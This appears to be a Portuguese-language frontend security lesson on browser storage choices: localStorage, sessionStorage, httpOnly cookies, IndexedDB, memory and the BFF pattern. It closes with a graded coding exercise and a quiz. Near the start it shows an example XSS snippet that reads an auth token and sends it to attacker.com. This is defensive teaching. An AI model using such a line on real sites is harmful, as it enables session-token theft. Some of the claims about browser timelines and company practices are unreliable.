@@ -1,0 +1,602 @@
+---
+id: storage-seguro
+title: "Storage seguro: localStorage, sessionStorage, cookies httpOnly, IndexedDB, memory"
+resources:
+  - title: "MDN - Web Storage API (oficial, EN)"
+    url: https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API
+    lang: en
+    type: doc
+    free: true
+  - title: "OWASP - HTML5 Security Cheat Sheet (oficial, EN)"
+    url: https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html
+    lang: en
+    type: doc
+    free: true
+  - title: "Auth0 - Where to Store Tokens (artigo, EN)"
+    url: https://auth0.com/docs/secure/security-guidance/data-security/token-storage
+    lang: en
+    type: artigo
+    free: true
+---
+
+Ate agora vimos o que **atacar** (XSS, CSRF)
+e como **defender no HTTP** (CSP, headers).
+Mas ha uma decisao que o dev frontend faz
+toda semana: **onde guardar esse dado no
+client?** Token de auth, preferencia de
+tema, cache de API, dados de form...
+
+A escolha errada pode:
+- **Vazar token via XSS** (localStorage).
+- **Esquecer no logout** (cookie sem
+  expiracao).
+- **Ser editada pelo usuario** (todos os
+  storages sao).
+- **Persistir apos logout** (sessionStorage
+  vs localStorage).
+
+Se voce entende os 5 storages do browser
+(`localStorage`, `sessionStorage`, cookies,
+`IndexedDB`, memory), os tradeoffs de cada
+um, e o **BFF (Backend For Frontend)
+pattern** que elimina 80% das preocupacoes,
+voce sai de "salva no localStorage porque
+e' mais facil" pra "token em cookie
+httpOnly, UI em localStorage, cache em
+IndexedDB".
+
+## O essencial 🟢
+
+**Os 5 storages do browser (e a pergunta
+que decide).** Antes de escolher, faca 2
+perguntas:
+
+1. **JS na pagina precisa ler/escrever?**
+   - **Sim** (tema, UI, cache) - use
+     `localStorage`, `sessionStorage`, ou
+     `IndexedDB`.
+   - **Nao** (token de auth) - use cookie
+     `httpOnly` (server-side, JS nao ve).
+2. **Quanto tempo persiste?**
+   - **Sessao (fecha aba)** - `sessionStorage`
+     ou memory.
+   - **Ate logout explicito** - cookie com
+     expiracao.
+   - **Sempre** (preferencia) - `localStorage`
+     ou `IndexedDB`.
+
+**Tabela comparativa dos 5 storages:**
+
+| Storage           | Acessivel por JS | Persiste        | Tamanho | Caso de uso                |
+| ----------------- | ---------------- | --------------- | ------- | -------------------------- |
+| `localStorage`    | Sim              | Ate limpar      | ~5-10MB | UI prefs, tema, draft     |
+| `sessionStorage`  | Sim              | Ate fechar aba  | ~5-10MB | Form data, wizard state   |
+| `Cookie`          | Sim (se nao httpOnly) | Configuravel | ~4KB | Auth, preferencias cross-server |
+| `IndexedDB`       | Sim              | Ate limpar      | ~50% disco | Cache, dados estruturados |
+| Memory (variavel) | Sim              | Refresh/F5      | Ilimitado | Tokens efemeros, state local |
+
+**`localStorage` - o storage "comodo" mas
+perigoso.** `localStorage` e' acessivel por
+**qualquer JS na pagina**. Se voce tem
+XSS, o atacante faz:
+
+```js
+// Codigo malicioso injetado via XSS
+const token = localStorage.getItem("auth_token");
+fetch("https://attacker.com/steal?token=" + token);
+```
+
+**NUNCA** use `localStorage` pra token de
+auth, refresh token, API key, ou qualquer
+dado que vaze a identidade do usuario. Use
+pra: **preferencias de UI** (tema, idioma),
+**draft** de formularios, **cache nao-sensivel**.
+
+**`sessionStorage` - melhor que localStorage,
+ainda vulnera vel a XSS.** Mesmo problema
+de XSS. Vantagem: **some quando fecha a
+aba**. Bom pra: state de wizard multi-step,
+form data temporario, UI state que nao
+deve persistir.
+
+**Cookie - o storage com mais controle.**
+Cookie tem **3 dimensoes de configuracao**
+que os outros storages nao tem:
+
+```http
+Set-Cookie: name=value; Expires=...; Max-Age=...; Domain=...; Path=...; Secure; HttpOnly; SameSite=Lax; Priority=...
+```
+
+- **`HttpOnly`:** **JS nao consegue ler**.
+  XSS nao rouba. E' a defesa primaria contra
+  XSS-robbery.
+- **`Secure`:** so envia em HTTPS. Defende
+  contra MITM.
+- **`SameSite=Lax` (default):** nao envia
+  em POST cross-site. Defende contra CSRF.
+- **`Expires`/`Max-Age`:** controla duracao.
+- **`Domain`/`Path`:** controla escopo.
+
+**Cookie `httpOnly` - a defesa de token
+padrão.** Para token de auth, use cookie
+`httpOnly` + `Secure` + `SameSite=Lax`:
+
+```ts
+// Server setta cookie seguro
+res.cookie("session", token, {
+  httpOnly: true,   // JS nao le
+  secure: true,     // so HTTPS
+  sameSite: "lax",  // CSRF protection
+  maxAge: 3600000,  // 1 hora
+  path: "/",
+});
+```
+
+Vantagem: XSS nao rouba (JS nao consegue
+ler `document.cookie` quando `httpOnly`).
+Vulneravel a CSRF, mitigado por SameSite.
+
+**`IndexedDB` - o "banco de dados" do
+browser.** Pra cache de dados estruturados
+(API responses, IndexedDB store local),
+use IndexedDB. Comparado a `localStorage`:
+
+- **Maior:** quota de ~50% do disco disponivel.
+- **Assincrono:** nao bloqueia o main thread.
+- **Transacional:** ACID.
+- **Indexado:** queries por campo.
+- **Suporta tipos complexos:** blob, file,
+  Date, etc.
+
+```bash
+pnpm add idb  # wrapper moderno
+```
+
+```ts
+import { openDB } from "idb";
+
+const db = await openDB("my-app", 1, {
+  upgrade(db) {
+    db.createObjectStore("users", { keyPath: "id" });
+  },
+});
+
+await db.put("users", { id: 1, name: "Ana" });
+const user = await db.get("users", 1);
+```
+
+Bom pra: **cache de dados do usuario**
+(perfil, lista de pedidos), **estado de
+SPA grande** (cart de e-commerce, draft
+de editor), **dados offline-first** (cobre
+em PWA).
+
+**Memory - o storage mais seguro.** Variavel
+JS em memoria (closure, ref, context) some
+no refresh. E' o storage **mais seguro**
+porque nao tem persistence (XSS nao
+persiste). Inviabilidade: **UX ruim**
+(usuario perde state no F5).
+
+Use pra: **tokens de curta duracao em
+SPA** (access token em memoria + refresh
+token em cookie httpOnly), **state
+sensivel temporario** (form de pagamento,
+dados de sessao).
+
+**A decision tree "qual storage?".**
+
+<Mermaid
+  chart={`flowchart TD
+    Start[Que dado quero guardar?]
+    Start --> Sensitive{E' sensitive?<br/>token, API key, dado pessoal}
+    Sensitive -->|Sim| InJS{JS na pagina precisa ler?}
+    Sensitive -->|Nao| UI{UI pref? cache? draft?}
+
+    InJS -->|Sim, precisa| Memory[Memory: variavel JS<br/>some no refresh]
+    InJS -->|Nao| HttpOnly[Cookie httpOnly + Secure + SameSite=Lax]
+    InJS -->|Sim, e persistente| BFF[BFF: cookie httpOnly<br/>+ BFF fala API com service token]
+
+    UI --> Size{Quantos dados?}
+    Size -->|< 1MB| Persist{Persiste cross-session?}
+    Size -->|> 1MB ou binario| IDB[IndexedDB via idb]
+    Persist -->|Sim| LocalStorage[localStorage]
+    Persist -->|Nao| SessionStorage[sessionStorage]
+    Persist -->|Cross-tab?| Cookie2[Cookie com expiracao]
+
+    HttpOnly --> Done
+    BFF --> Done
+    Memory --> Done
+    LocalStorage --> Done
+    SessionStorage --> Done
+    Cookie2 --> Done
+    IDB --> Done`}
+  caption="Decision tree do storage: dado sensitive vai pra cookie httpOnly ou memory. UI pref pequena vai pra localStorage. Cache grande vai pra IndexedDB. Sessao temporaria vai pra sessionStorage. Cross-server (ex: theme) vai pra cookie."
+/>
+
+**`document.cookie` - o que JS le e o que
+nao le.** Importante entender a regra:
+
+```js
+// JS pode ler
+document.cookie;
+// → "tema=escuro; lang=pt-BR"
+
+// JS NAO pode ler (httpOnly)
+document.cookie;
+// → "tema=escuro; lang=pt-BR"  // session NAO aparece
+```
+
+Cookie `httpOnly` e' **invisivel** pra
+`document.cookie`. JS so ve cookies
+"nao-httpOnly". O navegador gerencia
+internamente (envia em requests, mas nao
+expoe pro JS).
+
+**`Secure` flag - so HTTPS em prod.**
+Cookie sem `Secure` pode ser enviado em
+HTTP. Em dev, isso quebra. Em prod:
+
+```ts
+res.cookie("session", token, {
+  httpOnly: true,
+  secure: process.env.NODE_ENV === "production",  // so prod
+  sameSite: "lax",
+});
+```
+
+**`SameSite=None; Secure` - a excecao
+cross-site.** Se voce **precisa** de cookie
+em cross-site (iframe de terceiro, embed
+de pagamento), use `SameSite=None` +
+`Secure`:
+
+```http
+Set-Cookie: payment_token=abc; SameSite=None; Secure
+```
+
+**Atenção**: third-party cookies estao
+sendo **removidos** em 2024-2026. Chrome
+restringiu, Safari ja removeu, Firefox
+em rollout. Em 2026, third-party cookies
+**nao funcionam** na maioria dos browsers.
+**Evite**. Use BFF se possivel.
+
+**O BFF (Backend For Frontend) - a solucao
+moderna.** Em vez de SPA + API publica
+(com token em JS), use:
+
+```
+Browser (SPA)  ──cookie httpOnly──>  BFF (mesmo dominio)
+                                          │
+                                          │ service token
+                                          v
+                                      API publica
+```
+
+- Browser **so fala com mesmo origin** (BFF).
+  Sem CORS, sem CSRF (cookie httpOnly +
+  same-site garante).
+- BFF fala com API com **service token**
+  (nao cookie). Sem browser no caminho.
+- XSS no SPA **nao rouba o token** (httpOnly).
+- Logout = limpa cookie httpOnly (server
+  ou BFF).
+
+Pattern **recomendado em 2026** pra apps
+sensiveis. Stripe, GitHub, Linear usam
+BFF. Cobre em `backend` se quiser
+aprofundar.
+
+## Aprofundamento 🟡
+
+**Cookie prefixes - `__Host-` e `__Secure-`.**
+Prefixos que **forcam** certos atributos
+ou o cookie e' rejeitado:
+
+```http
+Set-Cookie: __Host-session=abc; Secure; Path=/; HttpOnly
+Set-Cookie: __Secure-session=abc; Secure
+```
+
+- **`__Host-`:** cookie **deve** ter
+  `Secure`, `Path=/`, e **nao** ter
+  `Domain`. Garante mesma origem exata.
+- **`__Secure-`:** cookie **deve** ter
+  `Secure` (HTTPS).
+
+`__Host-` e' a **defesa maxima** contra
+cookie injection. Em 2026, **use
+`__Host-` pra tokens de auth** se
+possivel.
+
+**`IndexedDB` em modo privado (Safari
+gotcha).** Em Safari, **modo privado**
+(janela anonima) trata IndexedDB como
+**in-memory** - some quando fecha a aba.
+`localStorage` tambem e limitado a ~0KB
+em modo privado Safari. Fallback
+necessario:
+
+```ts
+async function setItem(key: string, value: string) {
+  try {
+    localStorage.setItem(key, value);
+  } catch (e) {
+    // Safari private mode - localStorage throws QuotaExceededError
+    // Fallback to memory
+    memoryStorage.set(key, value);
+  }
+}
+```
+
+**`Cache API` (Service Worker) - outro
+storage.** Alem dos 5 classicos, Service
+Worker tem `Cache API`:
+
+```ts
+// Service Worker
+self.addEventListener("fetch", (event) => {
+  event.respondWith(
+    caches.match(event.request).then((cached) => {
+      return cached || fetch(event.request);
+    })
+  );
+});
+```
+
+`Cache` e' bom pra **cache de assets** (JS,
+CSS, images) com controle programatico.
+Cobre em PWA (#51).
+
+**Cryptographic storage - o que ainda
+nao da pra fazer.** Em 2026, **nao ha
+Web API** que criptografe storage de forma
+nativa. `localStorage`, `IndexedDB`,
+cookies - tudo e' **plaintext** no device.
+Se o atacante tem acesso ao filesystem
+(device roubado, malware), **le qualquer
+storage**.
+
+A defesa e' **criptografia em outro lugar**:
+- **Token em cookie httpOnly + `Secure`**:
+  HTTPS protege em transito. Device roubado:
+  depende do OS (Keychain no macOS,
+  Credential Manager no Windows).
+- **BFF + service token:** token nunca
+  toca o browser.
+- **Web Crypto API** (`crypto.subtle`):
+  criptografia client-side, mas a chave
+  tem que ser gerada/armazenada em algum
+  lugar (vulnera vel do mesmo jeito).
+
+**`Storage` event - comunicacao
+cross-tab.** Quando uma tab muda
+`localStorage`, **outras tabs no mesmo
+origin** recebem evento:
+
+```js
+// Tab A
+localStorage.setItem("carrinho", JSON.stringify(newCart));
+
+// Tab B
+window.addEventListener("storage", (e) => {
+  if (e.key === "carrinho") {
+    // Atualiza UI com novo carrinho
+  }
+});
+```
+
+Util pra: sincronizar logout entre tabs
+(limpar localStorage dispara event em
+todas as tabs). CUIDADO: evento so dispara
+em **outras tabs**, nao na que disparou.
+
+**`partitioned` storage - o futuro.**
+Chrome 2024+ introduziu **storage
+partitioning** - `localStorage` em
+`https://site.com` e' separado de
+`https://site.com` carregado em iframe
+de `https://other.com`. **Reduz** o
+rastreamento cross-site. Em 2026, **todos
+os storages sao partitioned** em Chrome.
+Afeta apps que usam storage pra "fingerprint"
+cross-site. Boa mudanca pra privacidade.
+
+## Pra quem quer ir mais alem 🔴
+
+**`localStorage` vs `IndexedDB` performance
+em escala.** Testes reais (2024, web.dev):
+
+- **localStorage:** ate 10MB sync.
+  Bloqueia o main thread. Ate ~5k registros
+  OK, depois lento.
+- **IndexedDB:** assincrono. Milhoes de
+  registros OK. **Muito** mais rapido pra
+  listas grandes.
+
+Pattern 2026: `localStorage` so pra
+**preferencias** (1-10 items). `IndexedDB`
+pra **cache de dados** (>100 items).
+
+**`Web Crypto API` pra storage
+client-side criptografado.** Pra dados
+que NAO podem ir pro server (ex: draft
+local de documento sensivel), voce pode
+criptografar com Web Crypto:
+
+```ts
+// Gerar chave (uma vez)
+const key = await crypto.subtle.generateKey(
+  { name: "AES-GCM", length: 256 },
+  true,
+  ["encrypt", "decrypt"]
+);
+
+// Criptografar antes de salvar
+const iv = crypto.getRandomValues(new Uint8Array(12));
+const encrypted = await crypto.subtle.encrypt(
+  { name: "AES-GCM", iv },
+  key,
+  new TextEncoder().encode(secret)
+);
+
+// Salvar encrypted no IndexedDB
+await db.put("secrets", { id: 1, encrypted, iv });
+```
+
+Problema: **a chave fica em algum lugar**
+(`localStorage`, IndexedDB, ou memory).
+Se o atacante tem acesso ao device, a
+chave esta' junto. **E' uma camada extra,
+nao bala de prata**.
+
+**`Samesite` vs `Secure` vs `HttpOnly` -
+porque sao 3 flags separados.** Cada um
+defende contra **ameaca diferente**:
+
+- `HttpOnly`: **XSS** (JS nao le cookie).
+- `Secure`: **MITM** (cookie so HTTPS).
+- `SameSite=Lax`: **CSRF** (cookie nao
+  envia cross-site POST).
+
+**Combine os 3** pra defesa em
+profundidade. Nenhum cobre tudo.
+
+**`CookieStore` API - o futuro do cookie
+client-side.** Nova API (Chrome 87+, Firefox
+em progresso, Safari 17+) que libera
+**ler/escrever cookies do JS** com **filtros**:
+
+```ts
+// Pedir cookies com filtros
+const cookies = await cookieStore.getAll({
+  name: "session",
+  domain: ".app.com",
+});
+
+// Setta com atributos
+await cookieStore.set({
+  name: "pref",
+  value: "dark",
+  expires: Date.now() + 86400000,
+  sameSite: "lax",
+});
+```
+
+`HttpOnly` cookies nao sao acessiveis via
+`CookieStore` (mantem a defesa). A API e'
+o **futuro** do cookie client-side, mas
+em 2026 ainda tem suporte limitado. Use
+com feature detection.
+
+**`Privacy Sandbox` e o futuro do storage.**
+Chrome planeja descontinuar third-party
+cookies ate 2025 (ja fez em 2024+). O
+**Privacy Sandbox** (Topics API, FLEDGE,
+Attribution Reporting) substitui tracking
+cross-site por APIs privacy-preserving.
+Em 2026, **localStorage e IndexedDB
+continuam**, mas uso pra fingerprint e
+tracking cross-site e' bloqueado.
+**Apps legitimos (auth, prefs) nao sao
+afetados**.
+
+**Leitura recomendada:**
+
+- [MDN - Web Storage API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API) - doc oficial MDN, completa.
+- [OWASP - HTML5 Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html) - guia OWASP com threats e mitigations.
+- [Auth0 - Where to Store Tokens](https://auth0.com/docs/secure/security-guidance/data-security/token-storage) - discussao pragmatica de storage de token.
+- [PortSwigger - JWT attacks](https://portswigger.net/web-security/jwt) - lab interativo pra explorar JWT attacks.
+
+> Dica: o erro mais comum em storage
+> seguro e' **token em localStorage**.
+> "Mas e' mais facil." Sim - e' roubado
+> por qualquer XSS. Use cookie `httpOnly`
+> + `Secure` + `SameSite=Lax`, ou BFF.
+> **Token em localStorage = primeiro
+> bug que aparece em pentest**. Se o seu
+> app tem token em localStorage, **troque
+> agora**. E' uma linha de codigo mudar
+> pra cookie httpOnly.
+
+No proximo no, vamos **supply chain**:
+como `package-lock.json` + `npm audit` +
+Snyk + Renovate + Dependabot + signed
+commits defendem seu app dos ataques que
+vieram via dependencias de terceiros
+(ataques tipo Log4Shell, ua-parser-js,
+event-stream, etc).
+
+<Checkpoint
+  challenge="Implemente a função `escolherStorage(dado)` que recebe um objeto com { tipo: 'token' | 'preference' | 'cache' | 'formDraft' | 'sensitive', persistente: boolean, tamanhoKb: number, crossTab: boolean } e retorna { storage: 'memory' | 'localStorage' | 'sessionStorage' | 'indexedDB' | 'cookie-httpOnly' | 'cookie-seguro', razao: string } - a escolha do storage ideal e a razao (1 frase)."
+  starterCode={`// Implemente escolherStorage(dado) que recebe:
+//
+// dado = {
+//   tipo: 'token', 'preference', 'cache', 'formDraft', 'sensitive',
+//   persistente: boolean,  // deve persistir cross-session?
+//   tamanhoKb: number,     // tamanho estimado do dado
+//   crossTab: boolean,     // multiplas tabs precisam compartilhar?
+// }
+//
+// E retorna { storage, razao } - a escolha do storage.
+//
+// Regras de escolha:
+// 1. tipo === 'token' ou 'sensitive':
+//    - persistente=true: 'cookie-httpOnly' com razao 'Token em cookie httpOnly e Secure - XSS nao rouba'
+//    - persistente=false: 'memory' com razao 'Token efemero em memory - some no refresh, sem XSS persistente'
+// 2. tipo === 'preference':
+//    - persistente=true: 'localStorage' com razao 'Preferencia persistente, sem risco de XSS roubo'
+//    - persistente=false: 'sessionStorage' com razao 'Preferencia temporaria, some na aba'
+//    - crossTab=true: 'cookie-seguro' com razao 'Preferencia cross-tab via cookie com expiracao'
+// 3. tipo === 'cache':
+//    - tamanhoKb <= 100: 'localStorage' com razao 'Cache pequeno em localStorage (ate 5MB)'
+//    - tamanhoKb > 100: 'indexedDB' com razao 'Cache grande em IndexedDB (async, sem limite pratico)'
+// 4. tipo === 'formDraft':
+//    - 'sessionStorage' com razao 'Draft de form temporario em sessionStorage - some ao fechar aba'
+function escolherStorage(dado) {
+  return { storage: "memory", razao: "" };
+}
+
+const _r1 = escolherStorage({ tipo: "token", persistente: true, tamanhoKb: 1, crossTab: false });
+console.log(JSON.stringify(_r1));
+
+const _r2 = escolherStorage({ tipo: "cache", persistente: true, tamanhoKb: 500, crossTab: false });
+console.log(JSON.stringify(_r2));
+
+const _r3 = escolherStorage({ tipo: "preference", persistente: true, tamanhoKb: 1, crossTab: true });
+console.log(JSON.stringify(_r3));
+
+const _r4 = escolherStorage({ tipo: "formDraft", persistente: false, tamanhoKb: 5, crossTab: false });
+console.log(JSON.stringify(_r4));`}
+  expected='{"storage":"cookie-httpOnly","razao":"Token em cookie httpOnly e Secure - XSS nao rouba"}
+{"storage":"indexedDB","razao":"Cache grande em IndexedDB (async, sem limite pratico)"}
+{"storage":"cookie-seguro","razao":"Preferencia cross-tab via cookie com expiracao"}
+{"storage":"sessionStorage","razao":"Draft de form temporario em sessionStorage - some ao fechar aba"}'
+  slug="seguranca-frontend"
+  nodeId="storage-seguro"
+/>
+
+<Quiz
+  question="Por que NUNCA guardar token de auth em localStorage?"
+  options={[
+    {
+      text: "Porque qualquer JS na pagina pode ler localStorage. Se voce tem XSS (mesmo minimo, via dependencia vulnera vel), o atacante rouba o token. localStorage nao tem como defender.",
+      correct: true,
+      explanation:
+        "localStorage e' acessivel por qualquer JS executando na pagina. XSS via input do usuario, dependencia vulneravel (caso event-stream 2018), ou extensao maliciosa - qualquer um deles pode fazer localStorage.getItem('token') e enviar pro attacker. localStorage nao tem defesa built-in contra isso. Cookie httpOnly e' INACESSIVEL por JS - browser gerencia internamente. E' a defesa primaria contra XSS-robbery. Migrar token de localStorage pra cookie httpOnly e' literalmente 1 linha de codigo + 1 dia de teste.",
+    },
+    {
+      text: "Porque localStorage tem limite de tamanho e token nao cabe.",
+      correct: false,
+      explanation:
+        "Nao. localStorage tem ~5-10MB, mais que suficiente pra token. O motivo NAO e' tamanho - e' SEGURANCA. localStorage e' acessivel por qualquer JS na pagina, e XSS rouba. Use cookie httpOnly (inacessivel por JS) ou BFF (token nunca toca o browser).",
+    },
+    {
+      text: "Porque localStorage nao funciona em HTTPS.",
+      correct: false,
+      explanation:
+        "Nao. localStorage funciona em HTTPS. O motivo de NAO usar localStorage pra token e' seguranca (XSS rouba), nao protocolo. localStorage e' seguro pra preferencias (tema, idioma), draft de form, cache nao-sensivel. NAO use pra token.",
+    },
+  ]}
+/>
